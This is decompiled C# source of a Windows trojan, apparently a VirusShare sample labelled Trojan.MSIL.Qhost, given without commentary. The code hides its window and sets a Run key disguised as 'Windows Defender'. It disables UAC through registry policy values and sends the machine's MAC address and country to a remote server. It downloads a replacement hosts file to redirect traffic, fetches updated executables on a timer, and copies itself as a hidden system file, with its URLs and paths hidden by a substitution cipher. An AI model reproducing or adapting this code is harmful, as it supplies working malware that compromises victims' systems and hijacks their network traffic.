// Decompiled with JetBrains decompiler
// Type: accs.accs
// Assembly: accs, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73B358C3-AEDD-4A5C-BAAE-891ED21EE1ED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Qhost.aul-fc4130dca4dee96e50bdf367eb6e9fecd635163b144402047bcb978d056f5043.exe

using accs.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace accs
{
  [DesignerGenerated]
  public class accs : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("WebBrowser1")]
    private WebBrowser _WebBrowser1;
    private string dirhosts;
    private string direxe;
    private string txturl1;
    private string txturl2;
    private string txturl3;
    private string txtdestino;
    private string exedestino;
    private string httpexe;
    private string httpexe2;
    private string rutareg;
    private string nameexe;
    private string respuestaurl;
    private long cont;
    private int version;
    private int version1;
    private bool ret;
    private bool exist;
    private bool exist1;
    private bool conectok;
    private Random random;
    private long numero;
    private WebRequest Peticion;
    private HttpWebResponse Respuesta;
    private string patron_busqueda;
    private string Patron_encripta;

    public accs()
    {
      this.Load += new EventHandler(this.accs_Load);
      this.random = new Random();
      this.patron_busqueda = "ABCDEFGHIJKLMNÑOPQRSTVWXYZ\\abcdefg:.hijklmnñopqrstvwxyz1234567890";
      this.Patron_encripta = "C37ILrÑPbQRqBSTV9WX6YZaA4:cd0eHf\\Eg1hKij5k.JlmOnñFop8GsNtvMDwxyz2";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Label1 = new Label();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.WebBrowser1 = new WebBrowser();
      this.SuspendLayout();
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      Point point1 = new Point(12, 9);
      Point point2 = point1;
      label1_1.Location = point2;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      Size size1 = new Size(39, 13);
      Size size2 = size1;
      label1_2.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Label1";
      WebBrowser webBrowser1_1 = this.WebBrowser1;
      point1 = new Point(91, 29);
      Point point3 = point1;
      webBrowser1_1.Location = point3;
      WebBrowser webBrowser1_2 = this.WebBrowser1;
      size1 = new Size(20, 20);
      Size size3 = size1;
      webBrowser1_2.MinimumSize = size3;
      this.WebBrowser1.Name = "WebBrowser1";
      WebBrowser webBrowser1_3 = this.WebBrowser1;
      size1 = new Size(134, 76);
      Size size4 = size1;
      webBrowser1_3.Size = size4;
      this.WebBrowser1.TabIndex = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(115, 0);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.WebBrowser1);
      this.Controls.Add((Control) this.Label1);
      this.Name = nameof (accs);
      this.Text = nameof (accs);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Timer1 != null)
          this._Timer1.Tick -= new EventHandler(this.Timer1_Tick);
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += new EventHandler(this.Timer1_Tick);
      }
    }

    internal virtual WebBrowser WebBrowser1
    {
      [DebuggerNonUserCode] get => this._WebBrowser1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._WebBrowser1 = value;
    }

    public string EncriptarCadena(string cadena)
    {
      int num1 = checked (cadena.Length - 1);
      int num2 = 0;
      string str;
      while (num2 <= num1)
      {
        str += this.EncriptarCaracter(cadena.Substring(num2, 1), cadena.Length, num2);
        checked { ++num2; }
      }
      return str;
    }

    private string EncriptarCaracter(string caracter, int variable, int a_indice) => this.patron_busqueda.IndexOf(caracter) != -1 ? this.Patron_encripta.Substring(checked (this.patron_busqueda.IndexOf(caracter) + variable + a_indice) % this.patron_busqueda.Length, 1) : caracter;

    public string DesEncriptarCadena(string cadena)
    {
      int num1 = checked (cadena.Length - 1);
      int num2 = 0;
      string str;
      while (num2 <= num1)
      {
        str += this.DesEncriptarCaracter(cadena.Substring(num2, 1), cadena.Length, num2);
        checked { ++num2; }
      }
      return str;
    }

    private string DesEncriptarCaracter(string caracter, int variable, int a_indice) => this.Patron_encripta.IndexOf(caracter) != -1 ? this.patron_busqueda.Substring((checked (this.Patron_encripta.IndexOf(caracter) - variable - a_indice) <= 0 ? checked (this.patron_busqueda.Length + unchecked (checked (this.Patron_encripta.IndexOf(caracter) - variable - a_indice) % this.Patron_encripta.Length)) : checked (this.Patron_encripta.IndexOf(caracter) - variable - a_indice) % this.Patron_encripta.Length) % this.Patron_encripta.Length, 1) : caracter;

    public bool conect()
    {
      bool isAvailable;
      try
      {
        isAvailable = MyProject.Computer.Network.IsAvailable;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      return isAvailable;
    }

    public long contar(long cnt)
    {
      try
      {
        this.cont = checked (cnt + 1L);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      long num1;
      return num1;
    }

    public long contar() => this.cont;

    public bool crearCarpetaHidden()
    {
      try
      {
        MyProject.Computer.FileSystem.CreateDirectory(this.DesEncriptarCadena("Tn5XwOuwpzÑ7"));
        FileSystem.SetAttr(this.DesEncriptarCadena("Tn5XwOuwpzÑ7"), FileAttribute.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public bool inicializacion()
    {
      this.version = 2;
      this.version1 = 0;
      bool flag;
      return flag;
    }

    public bool amigoonline(string mac, string pais)
    {
      try
      {
        this.WebBrowser1.Url = new Uri(this.DesEncriptarCadena("4ijhc//ovNEstvK225xrz/~8uxplzxn/1zyw3t/2rDxX7SrV?SCI=") + mac + this.DesEncriptarCadena("&81OM=") + pais, UriKind.RelativeOrAbsolute);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public string sacarmac()
    {
      string str1;
      try
      {
        string str2 = "";
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\" + "." + "\\root\\cimv2")), (System.Type) null, "ExecQuery", new object[1]
        {
          (object) "Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE"
        }, (string[]) null, (System.Type[]) null, (bool[]) null));
        try
        {
          foreach (object obj in (IEnumerable) objectValue)
            str2 = Conversions.ToString(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (System.Type) null, "MACAddress", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public string sacarpais()
    {
      string str;
      try
      {
        str = Conversions.ToString(MyProject.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\\International", true).GetValue("sCountry"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public bool verificarurl(string URL)
    {
      bool flag;
      try
      {
        ((HttpWebRequest) WebRequest.Create(URL)).GetResponse().Close();
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool Descargar_Archivo(string Url, string Path_Destino, string dirhost1)
    {
label_0:
      int num1;
      bool flag;
      int num2;
      try
      {
        int num3 = 1;
        if (this.verificarurl(Url))
        {
label_1:
          num3 = 2;
          if (!(Operators.CompareString(Url, (string) null, false) == 0 | Operators.CompareString(Path_Destino, (string) null, false) == 0))
            goto label_3;
        }
        else
          goto label_21;
label_2:
        num3 = 3;
        int num4 = (int) Interaction.MsgBox((object) "No se indicó la url o el archivo de destino", MsgBoxStyle.Critical, (object) "Error");
        goto label_21;
label_3:
        num3 = 5;
label_4:
        num3 = 6;
        if (Strings.Len(FileSystem.Dir(Path_Destino)) == 0)
          goto label_6;
label_5:
        num3 = 7;
        MyProject.Computer.FileSystem.DeleteFile(Path_Destino);
        goto label_21;
label_6:
        num3 = 9;
label_7:
        ProjectData.ClearProjectError();
        num1 = -2;
label_8:
        num3 = 11;
        MyProject.Computer.Network.DownloadFile(Url, Path_Destino);
label_9:
        num3 = 12;
        if (Information.Err().Number != 0)
          goto label_12;
label_10:
        num3 = 13;
        MyProject.Computer.FileSystem.MoveFile(Path_Destino, dirhost1, true);
label_11:
        num3 = 14;
        flag = true;
        goto label_14;
label_12:
        num3 = 16;
label_13:
        num3 = 17;
        flag = false;
label_14:
        num3 = 19;
        Information.Err().Clear();
        goto label_21;
label_16:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 8:
              case 20:
              case 21:
              case 22:
              case 23:
                goto label_21;
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 9:
                goto label_6;
              case 10:
                goto label_7;
              case 11:
                goto label_8;
              case 12:
                goto label_9;
              case 13:
                goto label_10;
              case 14:
                goto label_11;
              case 15:
              case 18:
              case 19:
                goto label_14;
              case 16:
                goto label_12;
              case 17:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      int num6 = flag ? 1 : 0;
      if (num2 == 0)
        return num6 != 0;
      ProjectData.ClearProjectError();
      return num6 != 0;
    }

    public bool Arranques()
    {
      try
      {
        MyProject.Computer.Registry.CurrentUser.DeleteSubKeyTree(this.DesEncriptarCadena("2x8IÑoLtT3dYjK.j0O4ZKJ\\nNG\\Qutv.sy1OzCNzyn5u3"));
        MyProject.Computer.Registry.SetValue(this.DesEncriptarCadena("rQL:_rUA4qZe_UfW\\k1xoIÑñLsoKztRbSR2WwvbTIXc4Imud0S:EÑWghcgEXquK"), "Windows Defender", (object) this.DesEncriptarCadena(".RIC8MFyrIqg5hiZ\\FFY:JgñHnF0gtoOpN5vOJCm"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public bool QuitarUAC()
    {
      try
      {
        this.rutareg = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        object Instance1 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance1, (System.Type) null, "SetValue", new object[2]
        {
          (object) "ConsentPromptBehaviorAdmin",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance2 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance2, (System.Type) null, "SetValue", new object[2]
        {
          (object) "dontdisplaylastusername",
          (object) 1
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance2, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance3 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance3, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableInstallerDetection",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance3, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance4 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance4, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableLUA",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance4, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance5 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance5, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableSecureUIAPaths",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance5, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance6 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance6, (System.Type) null, "SetValue", new object[2]
        {
          (object) "FilterAdministratorToken",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance6, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance7 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance7, (System.Type) null, "SetValue", new object[2]
        {
          (object) "ValidateAdminCodeSignatures",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance7, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance8 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance8, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableUIADesktopToggle",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance8, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    private void accs_Load(object sender, EventArgs e)
    {
      try
      {
        this.Hide();
        this.Visible = false;
        this.numero = (long) this.random.Next(10000, 100000);
        string executablePath = Application.ExecutablePath;
        this.inicializacion();
        this.Timer1.Enabled = true;
        this.Arranques();
        this.QuitarUAC();
        this.crearCarpetaHidden();
        this.conectok = false;
        this.dirhosts = this.DesEncriptarCadena("jPCyS6bAfeb7KE1XeOOWa5fmdlO:fofe5Fstt");
        this.txturl1 = this.DesEncriptarCadena("fmOJE//GsN5nutOjwtMp.pñ3/GñysÑyG/vbPVzRX/2BWPAZZd9aHSAZXWeKY");
        this.txturl2 = this.DesEncriptarCadena("\\Onlg//lñ1KntkK5xvxIpOyw/oGzNGb2B3xT/uTIX2Ir/9TqVb:g/Yg9TWYij");
        this.txtdestino = this.DesEncriptarCadena("aNñcIsuIDÑTRMQW2Ñ7WI");
        this.direxe = this.DesEncriptarCadena(".RIC8MFyrIqg5hiZ\\FFY:JgñHnF0gtoOpN5vOJCm");
        this.httpexe = this.DesEncriptarCadena("6EgfZ//k.J0:1hkdJ\\0j815JF5G/iGonDwDMty8/CNqÑ2vCQ");
        this.httpexe2 = this.DesEncriptarCadena("6EgfZ//k.J0:1hkdJ\\0j815JF5G/iGonDwDMty8/CNqÑ2vCQ");
        if (!this.conect())
          return;
        this.amigoonline(this.sacarmac(), this.sacarpais());
        if (!this.Descargar_Archivo(this.txturl1, this.txtdestino, this.dirhosts))
          this.Descargar_Archivo(this.txturl2, this.txtdestino, this.dirhosts);
        this.exist = MyProject.Computer.FileSystem.FileExists(this.direxe);
        if (this.exist)
          return;
        MyProject.Computer.FileSystem.CopyFile(executablePath, this.direxe);
        FileSystem.SetAttr(this.direxe, FileAttribute.System);
        FileSystem.SetAttr(this.direxe, FileAttribute.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        this.Hide();
        this.Visible = false;
        this.numero = (long) this.random.Next(10000, 100000);
        string Path_Destino = this.DesEncriptarCadena("aNñcIsuIDÑTRMQW2Ñ7WI");
        this.Label1.Text = Conversions.ToString(this.contar());
        this.contar(checked ((long) Math.Round(Conversion.Val(this.Label1.Text))));
        this.conectok = this.conect();
        if (this.conectok)
        {
          if (!(this.contar() == 15L | this.contar() > 15L | this.contar() == 0L))
            return;
          if (this.conect())
          {
            if (Operators.CompareString(this.httpexe, "", false) != 0 && this.verificarurl(this.httpexe))
            {
              MyProject.Computer.FileSystem.RenameFile(this.direxe, Conversions.ToString(this.numero));
              this.Descargar_Archivo(this.httpexe, Path_Destino, this.direxe);
            }
            if (Operators.CompareString(this.httpexe2, "", false) != 0 && this.verificarurl(this.httpexe2))
            {
              MyProject.Computer.FileSystem.RenameFile(this.direxe, Conversions.ToString(this.numero));
              this.Descargar_Archivo(this.httpexe2, Path_Destino, this.direxe);
            }
            if (!this.Descargar_Archivo(this.txturl2, Path_Destino, this.dirhosts))
              this.Descargar_Archivo(this.txturl1, Path_Destino, this.dirhosts);
          }
          this.cont = 0L;
        }
        else
          this.cont = -1L;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
    }
  }
}
